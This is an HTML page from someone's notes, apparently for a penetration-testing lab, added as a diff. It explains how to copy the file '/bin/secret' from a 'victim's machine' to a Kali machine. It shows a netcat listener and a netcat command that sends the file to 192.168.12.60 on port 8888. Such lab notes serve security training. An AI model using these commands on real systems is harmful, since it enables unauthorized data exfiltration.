@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>5.2 Send file to the Kali Machine</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>5.2 Send file to the Kali Machine</h1><br/><p></p><p>You have to get the “/bin/secret” from the victim&#39;s machine to your Kali Machine.</p><p></p><p>1. Run &quot;netcat&#39; on your Kali Machine to listen.</p><p>   <div class="codebox"><pre>$ nc -lp 8888 &gt;secret</pre></div></p><p>   </p><p>2. Transfer the file from the victim&#39;s machine.</p><p>   <div class="codebox"><pre>first@first<span style="color:#a52a2a;font-weight:700">:/</span>tmp$ nc -w 3 192.168.12.60 8888 &lt; <span style="color:#a52a2a;font-weight:700">/</span>bin<span style="color:#a52a2a;font-weight:700">/</span>secret<br /></pre></div></p><p>   </p><p></p></div>
+</body>
+</html>
